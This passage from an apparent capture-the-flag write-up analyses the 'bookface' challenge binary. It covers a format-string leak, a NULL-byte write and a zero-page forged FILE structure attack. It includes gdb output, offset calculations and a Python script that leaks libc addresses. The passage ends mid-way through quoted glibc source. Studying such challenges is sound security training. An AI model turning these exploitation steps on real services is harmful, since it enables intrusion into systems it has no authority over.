&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">remove&lt;/span>(file);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">login&lt;/span>();
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This will remove the file corresponding to userid, the call &lt;code>login&lt;/code> function again.&lt;/p>
&lt;ol start="4">
&lt;li>&lt;em>login off&lt;/em>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Logging out...&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">sprintf&lt;/span>(file, &lt;span style="color:#e6db74">&amp;#34;users/%d&amp;#34;&lt;/span>, uid);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>FILE &lt;span style="color:#f92672">*&lt;/span>f &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fopen&lt;/span>(file, &lt;span style="color:#e6db74">&amp;#34;wb&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fwrite&lt;/span>(user, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> profile), f);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fclose&lt;/span>(f);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">login&lt;/span>();
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This will write the content pointed by &lt;code>user&lt;/code> to the file corresponding to userid, and then will call &lt;code>login&lt;/code> again.&lt;/p>
&lt;p>Let&amp;rsquo;s get back to &lt;code>login&lt;/code> function, at the end if the survey rates were different then &lt;em>10, 10, 10, 10&lt;/em> the program do this instruction &lt;code>*(user-&amp;gt;friends) = 0&lt;/code> which will dereference the &lt;code>friends&lt;/code> &lt;code>long long*&lt;/code> pointer and set its content to 0 (i.e. write 8 NULL bytes where &lt;code>friends&lt;/code> is pointing), it means we have arbitrary 8 NULL bytes write.&lt;/p>
&lt;p>&lt;strong>Another remark:&lt;/strong> The program lacks errors checking, overall there are no error checking when dealing with files (&lt;code>fopen&lt;/code>, &lt;code>fclose&lt;/code>, &lt;code>fread&lt;/code>).&lt;/p>
&lt;h2 id="detected-vulnerabilities">Detected vulnerabilities&lt;/h2>
&lt;ul>
&lt;li>Format String vulnerability (&amp;ldquo;arbitrary write&amp;rdquo; isn&amp;rsquo;t included since &amp;rsquo;n&amp;rsquo; letter is filtered) in login function.&lt;/li>
&lt;li>Arbitrary 8 NULL bytes write via friends pointer.&lt;/li>
&lt;li>The lack of errors checking.&lt;/li>
&lt;/ul>
&lt;h2 id="exploitation">Exploitation&lt;/h2>
&lt;p>None of these vulnerabilities on their own allow us to exploit this binary, we need to use multiples attacks to achieve code execution on the remote server.&lt;/p>
&lt;p>Note that the 1st line of Dockerfile contains a comment:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#IMPORTANT: on host system: sysctl vm.mmap_min_addr=0&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>What does it mean?&lt;/p>
&lt;p>&lt;code>mmap_min_addr&lt;/code> is a kernel tunable that specifies the minimum virtual address that a process is allowed to mmap&lt;sup id="fnref:3">&lt;a href="#fn:3" class="footnote-ref" role="doc-noteref">3&lt;/a>&lt;/sup>, Allowing processes to map low values expose the system to &amp;ldquo;Kernel NULL pointer dereference&amp;rdquo; attacks&lt;sup id="fnref:4">&lt;a href="#fn:4" class="footnote-ref" role="doc-noteref">4&lt;/a>&lt;/sup>.&lt;/p>
&lt;p>It was introduced to Linux Kernel as mitigation against Null Pointer Dereference Attacks, but in our case it&amp;rsquo;s disabled since &lt;em>mmap_min_addr=0&lt;/em>.&lt;/p>
&lt;p>You can check the current value in your local machine at &lt;code>/proc/sys/vm/mmap_min_addr&lt;/code> (Arch linux, for other distributions maybe at a different location)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ cat /proc/sys/vm/mmap_min_addr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">65536&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The default value in Arch Linux is &lt;em>65536&lt;/em> (&lt;em>0x10000&lt;/em>).&lt;/p>
&lt;p>&lt;strong>N.B.&lt;/strong> This a Kernel feature like ASLR, and Linux containers share the same kernel with the host machine.&lt;/p>
&lt;p>If you are familiar with Linux Kernel Exploitation you probably know how NULL pointer dereference happens, most of the time is due to the lack of error checking.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>FILE &lt;span style="color:#f92672">*&lt;/span>f &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fopen&lt;/span>(file, &lt;span style="color:#e6db74">&amp;#34;rb&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fread&lt;/span>(user, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> profile), f);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fclose&lt;/span>(f);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Upon successful completion &lt;code>fopen&lt;/code> returns a &lt;code>FILE&lt;/code> pointer Otherwise, &lt;code>NULL&lt;/code> is returned.&lt;/p>
&lt;p>NULL is just a zero value, NULL pointer is 8 (or 4 in 32 bits machine) null bytes (i.e. 0x0000000000000000 or 0x00000000 in 32 bits machine).&lt;/p>
&lt;p>What will happen if &lt;code>fopen&lt;/code> fails? basically the following:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fread&lt;/span>(user, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> profile), (FILE &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fclose&lt;/span>((FILE &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>fread&lt;/code> and &lt;code>fclose&lt;/code> will dereference the &lt;code>f&lt;/code> &lt;em>FILE&lt;/em> pointer (&lt;code>f&lt;/code> will points to &lt;em>0x0000000000000000&lt;/em> memory address).&lt;/p>
&lt;p>So if we can map (allocate) memory at the &lt;em>0x0000000000000000&lt;/em> address (&lt;em>Zero Page&lt;/em>) and write a forged FILE structure there.&lt;/p>
&lt;p>&lt;code>fread&lt;/code> and &lt;code>fclose&lt;/code> will simply consider it as valid FILE structure.&lt;/p>
&lt;p>The question is therefore: How can this helps us achieve code execution?&lt;/p>
&lt;p>&lt;a href="https://gsec.hitb.org/sg2018/speakers/an-jie-yang-angelboy/">@Angelboy&lt;/a> in his paper &lt;strong>FILE Structures: Another Binary Exploitation Technique&lt;/strong>&lt;sup id="fnref:5">&lt;a href="#fn:5" class="footnote-ref" role="doc-noteref">5&lt;/a>&lt;/sup>, presented at HITB GSEC 2018 Conference proposed a new attack technique that exploits the &lt;em>FILE&lt;/em> structure in GNU C Library (&lt;em>glibc&lt;/em>) to gain control over execution flow (&lt;em>RIP&lt;/em>), this technique won&amp;rsquo;t only get &lt;em>RIP&lt;/em> control, but also control over &lt;em>RDI&lt;/em>, &lt;em>RSI&lt;/em> and &lt;em>RDX&lt;/em>.&lt;/p>
&lt;p>The attack is illustrated in &lt;a href="https://dhavalkapil.com/about/">@Dhaval Kapil&lt;/a> blog post &lt;strong>FILE Structure Exploitation (&amp;lsquo;vtable&amp;rsquo; check bypass)&lt;/strong>&lt;sup id="fnref:6">&lt;a href="#fn:6" class="footnote-ref" role="doc-noteref">6&lt;/a>&lt;/sup>, it calls &lt;code>fclose&lt;/code> with a forged FILE structure, this structure contains &lt;code>vtable&lt;/code>, which is a pointer to a table contains functions that will be called when the original &lt;code>FILE&lt;/code> pointer is used to perform different operations (e.g. &lt;code>fclose&lt;/code>, &lt;code>fread&lt;/code>, &lt;code>fwrite&lt;/code>).&lt;/p>
&lt;p>So what we need right now is:&lt;/p>
&lt;ol>
&lt;li>Make &lt;code>mmap&lt;/code> maps a memory page at address &lt;em>0x0000000000000000&lt;/em>.&lt;/li>
&lt;li>Forge a malicious FILE structure at &lt;em>0x0000000000000000&lt;/em>.&lt;/li>
&lt;li>Make &lt;code>fopen&lt;/code> fails and return NULL in order to call &lt;code>fclose((FILE *)0)&lt;/code>.&lt;/li>
&lt;/ol>
&lt;h3 id="libc--pie-leak">LIBC + PIE Leak&lt;/h3>
&lt;p>The binary comes with all protection schemes + ASLR enabled.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ checksec --file bookface
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Arch: amd64-64-little
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RELRO: Full RELRO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Stack: Canary found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NX: NX enabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PIE: PIE enabled
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We need to leak some addresses to bypass &lt;code>PIE&lt;/code> and &lt;code>ASLR&lt;/code>.&lt;/p>
&lt;p>We&amp;rsquo;ll use Format String Attack to get leak to address in the stack, to get to that we need to provide a userid then logout and use the same userid.&lt;/p>
&lt;p>We&amp;rsquo;ll set a breakpoint at &lt;code>*login+501&lt;/code> where the program calls &lt;code>printf(survey)&lt;/code> and observe what&amp;rsquo;s in the stack at that point.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-none" data-lang="none">$ gdb-gef bookface
...
gef&amp;gt; break *login+820
Breakpoint 1 at 0x449e
gef&amp;gt; run
Starting program: /home/philomath213/Documents/CTFs/angstromctf2020/bookface/bookface
Please enter your user ID: 2130
Welcome to bookface!
What&amp;#39;s your name? ABCD
You have 0 friends. What would you like to do?
[1] Make friends
[2] Lose friends
[3] Delete account
[4] Log out
&amp;gt; 4
Logging out...
Please enter your user ID: 2130
Before you log back in, please complete a brief survey.
For each of the following categories, rate us from 1-10.
Content: %p%p%p%p%p
Moderation: Interface: Support: Those ratings don&amp;#39;t seem quite right. Please review them and try again:
...
gef&amp;gt; info frame
Stack level 0, frame at 0x7fffffffdef0:
rip = 0x55555555849e in login; saved rip = 0x555555558985
called by frame at 0x7fffffffdf60
Arglist at 0x7fffffffdee0, args:
Locals at 0x7fffffffdee0, Previous frame&amp;#39;s sp is 0x7fffffffdef0
Saved registers:
rbp at 0x7fffffffdee0, rip at 0x7fffffffdee8
...
gef➤ telescope 32
0x00007fffffffde70│+0x0000: 0x0000000b00000000 ← $rsp
0x00007fffffffde78│+0x0008: 0x00007ffff7a9153c → &amp;lt;free+76&amp;gt; add rsp, 0x28
0x00007fffffffde80│+0x0010: &amp;#34;%p%p%p%p%p\n&amp;#34; ← $rdi
0x00007fffffffde88│+0x0018: 0x00000000000a7025 (&amp;#34;%p\n&amp;#34;?)
0x00007fffffffde90│+0x0020: 0x0000000000000000
0x00007fffffffde98│+0x0028: 0x0000000000000000
0x00007fffffffdea0│+0x0030: &amp;#34;users/2130&amp;#34;
0x00007fffffffdea8│+0x0038: 0x0000555555003033 (&amp;#34;30&amp;#34;?)
0x00007fffffffdeb0│+0x0040: 0x0000000000000000
0x00007fffffffdeb8│+0x0048: 0x00005555555581b0 → &amp;lt;_start+0&amp;gt; endbr64
0x00007fffffffdec0│+0x0050: 0x00007fffffffe030 → 0x0000000000000001
0x00007fffffffdec8│+0x0058: 0x00007ffff7a7a363 → &amp;lt;fclose+259&amp;gt; mov eax, ebp
0x00007fffffffded0│+0x0060: 0x0000000000000000
0x00007fffffffded8│+0x0068: 0xf46cff2f1bf3ec00
0x00007fffffffdee0│+0x0070: 0x00007fffffffdf50 → 0x00005555555589a0 → &amp;lt;__libc_csu_init+0&amp;gt; endbr64 ← $rbp
0x00007fffffffdee8│+0x0078: 0x0000555555558985 → &amp;lt;main+681&amp;gt; jmp 0x555555558992 &amp;lt;main+694&amp;gt;
0x00007fffffffdef0│+0x0080: 0x0000000000000001
0x00007fffffffdef8│+0x0088: 0x000003e8ffffdf70
0x00007fffffffdf00│+0x0090: 0x00007ffff7ffe168 → 0x0000555555554000 → 0x00010102464c457f
0x00007fffffffdf08│+0x0098: 0x000055555557e010 → 0x00000000fbad240c
0x00007fffffffdf10│+0x00a0: &amp;#34;users/2130&amp;#34;
0x00007fffffffdf18│+0x00a8: 0x0000555555003033 (&amp;#34;30&amp;#34;?)
0x00007fffffffdf20│+0x00b0: 0x00007fffffffdf4e → 0x5555555589a0f46c
0x00007fffffffdf28│+0x00b8: 0x0000000000000000
0x00007fffffffdf30│+0x00c0: 0x00005555555589a0 → &amp;lt;__libc_csu_init+0&amp;gt; endbr64
0x00007fffffffdf38│+0x00c8: 0x00005555555581b0 → &amp;lt;_start+0&amp;gt; endbr64
0x00007fffffffdf40│+0x00d0: 0x00007fffffffe030 → 0x0000000000000001
0x00007fffffffdf48│+0x00d8: 0xf46cff2f1bf3ec00
0x00007fffffffdf50│+0x00e0: 0x00005555555589a0 → &amp;lt;__libc_csu_init+0&amp;gt; endbr64
0x00007fffffffdf58│+0x00e8: 0x00007ffff7a2d830 → &amp;lt;__libc_start_main+240&amp;gt; mov edi, eax
0x00007fffffffdf60│+0x00f0: 0x0000000000000001
0x00007fffffffdf68│+0x00f8: 0x00007fffffffe038 → 0x00007fffffffe332 → &amp;#34;/home/philomath213/Documents/CTFs/angstromctf2020/[...]&amp;#34;
&lt;/code>&lt;/pre>&lt;p>The login function stack frame is located at &lt;em>0x7fffffffdef0&lt;/em> (&lt;em>$rsp+0x0090&lt;/em>), and the saved return address is located at &lt;em>0x7fffffffdee8&lt;/em> (&lt;em>$rsp+0x0078&lt;/em>) this pointer will give us the binary base where it&amp;rsquo;s loaded, there is another interesting pointer at &lt;em>0x00007fffffffdf58&lt;/em> (&lt;em>$rsp+0x00e8&lt;/em>) a libc pointer, it will give us libc base address.&lt;/p>
&lt;p>The format string offset for the 1st pointer will be &lt;em>21&lt;/em> (&lt;code>%21$p&lt;/code>) while the 2nd will be &lt;em>35&lt;/em> (&lt;code>%35$p&lt;/code>).&lt;/p>
&lt;p>In order to calculate the base address from these two pointers we need precalculate the offsets.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef&amp;gt; vmmap
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Start End Offset Perm Path
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x0000555555554000 0x0000555555558000 0x0000000000000000 r-- /home/philomath213/Documents/CTFs/angstromctf2020/bookface/bookface
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The binary base address is &lt;em>0x0000555555554000&lt;/em> and the leaked address is &lt;em>0x0000555555558985&lt;/em>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef&amp;gt; p 0x0000555555558985 - 0x0000555555554000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$1 &lt;span style="color:#f92672">=&lt;/span> 0x4985
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We do the same for libc address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef&amp;gt; p 0x00007ffff7a2d830 - 0x00007ffff7a0d000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$2 &lt;span style="color:#f92672">=&lt;/span> 0x20830
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="libc-address-leak-exploit">libc address leak exploit&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>libc_offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x20830&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid &lt;span style="color:#f92672">=&lt;/span> randint(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#ae81ff">30&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># create user with uid and name AAAA&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;Please enter your user ID: &amp;#34;&lt;/span>, str(uid))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;What&amp;#39;s your name? &amp;#34;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;AAAA&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># logout&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;&amp;gt; &amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;4&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># login again with same uid&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;Please enter your user ID: &amp;#34;&lt;/span>, str(uid))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># format string offset&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;AA%35$pBB&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">assert&lt;/span> len(payload) &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;Content: &amp;#34;&lt;/span>, payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;AA&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>leak &lt;span style="color:#f92672">=&lt;/span> T&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;BB&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>strip(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;BB&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>leak &lt;span style="color:#f92672">=&lt;/span> int(leak, base&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;leak: 0x&lt;/span>&lt;span style="color:#e6db74">{:016x}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(leak))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc_base &lt;span style="color:#f92672">=&lt;/span> leak &lt;span style="color:#f92672">-&lt;/span> libc_offset
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;libc_base: 0x&lt;/span>&lt;span style="color:#e6db74">{:016x}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(libc_base))
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="zero-page">Zero Page&lt;/h4>
&lt;p>We need to write the forged &lt;em>FILE&lt;/em> structure into the &lt;em>Zero Page&lt;/em> (i.e. memory page at &lt;em>0x0000000000000000&lt;/em>), when login with a new userid the following instruction will be executed:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Welcome to bookface!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>user &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">mmap&lt;/span>(&lt;span style="color:#a6e22e">rand&lt;/span>()&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#ae81ff">0xfffffffffffff000&lt;/span>, &lt;span style="color:#66d9ef">sizeof&lt;/span> (&lt;span style="color:#66d9ef">struct&lt;/span> profile), PROT_READ&lt;span style="color:#f92672">|&lt;/span>PROT_WRITE, MAP_PRIVATE&lt;span style="color:#f92672">|&lt;/span>MAP_ANONYMOUS&lt;span style="color:#f92672">|&lt;/span>MAP_FIXED, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;What&amp;#39;s your name? &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fgets&lt;/span>(user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name, &lt;span style="color:#ae81ff">0x100&lt;/span>, stdin);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>mmap&lt;/code> will map a page at &lt;code>rand() &amp;amp; 0xfffffffffffff000&lt;/code>, there are two ways (maybe more) to make that value be zero:&lt;/p>
&lt;h4 id="1-easy-dirty-way-brutforce">1. Easy dirty way &amp;ldquo;Brutforce&amp;rdquo;:&lt;/h4>
&lt;p>&lt;code>rand()&lt;/code> (see &lt;code>man 3 rand&lt;/code>) will return a pseudo-random integer in range &lt;code>[0, RAND_MAX]&lt;/code>, &lt;code>RAND_MAX&lt;/code> dependent on the implementation, but it&amp;rsquo;s guaranteed that this value is at least &lt;em>32767&lt;/em> (&lt;em>0x7fff&lt;/em>)&lt;sup id="fnref:7">&lt;a href="#fn:7" class="footnote-ref" role="doc-noteref">7&lt;/a>&lt;/sup>. there is a chance that &lt;code>rand()&lt;/code> will return a integer less than &lt;em>0x1000&lt;/em>.&lt;/p>
&lt;h4 id="2-hard-efficient-way-abusing-glibc-prng">2. Hard efficient way &amp;ldquo;Abusing glibc PRNG&amp;rdquo;:&lt;/h4>
&lt;p>&lt;em>glibc&lt;/em> pseudo-random-number-generator (&lt;em>PRNG&lt;/em>)&lt;sup id="fnref:8">&lt;a href="#fn:8" class="footnote-ref" role="doc-noteref">8&lt;/a>&lt;/sup> like any &lt;em>PRNG&lt;/em> generates a sequence of random numbers, this sequence is not truly random, because it is determined by the &lt;em>PRNG&lt;/em>&amp;rsquo;s state which is initially the seed value set by &lt;code>srand&lt;/code>, in our case it is &lt;code>time(NULL)&lt;/code>, &lt;em>glibc PRNG&lt;/em> (see &lt;code>man 3 rand&lt;/code>) use hidden state that is modified on each call, this hidden state is probably located at writable memory in libc address space.&lt;/p>
&lt;p>To find how &lt;em>glibc PRNG&lt;/em> works we need to dig deeper in &lt;em>glibc&lt;/em> source code, I usually use &lt;strong>Bootlin - Elixir Cross Referencer&lt;/strong> &lt;sup id="fnref:9">&lt;a href="#fn:9" class="footnote-ref" role="doc-noteref">9&lt;/a>&lt;/sup> to browse Linux Kernel and Glibc source code, actually the &lt;code>rand&lt;/code> function is just wrapper to &lt;code>__random&lt;/code> and the latter is also a wrapper to &lt;code>__random_r&lt;/code>, make sure you are browsing the correct glibc version &lt;strong>glibc-2.23&lt;/strong> &lt;sup id="fnref:10">&lt;a href="#fn:10" class="footnote-ref" role="doc-noteref">10&lt;/a>&lt;/sup>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">rand&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>) &lt;span style="color:#a6e22e">__random&lt;/span> ();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">__random&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int32_t&lt;/span> retval;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
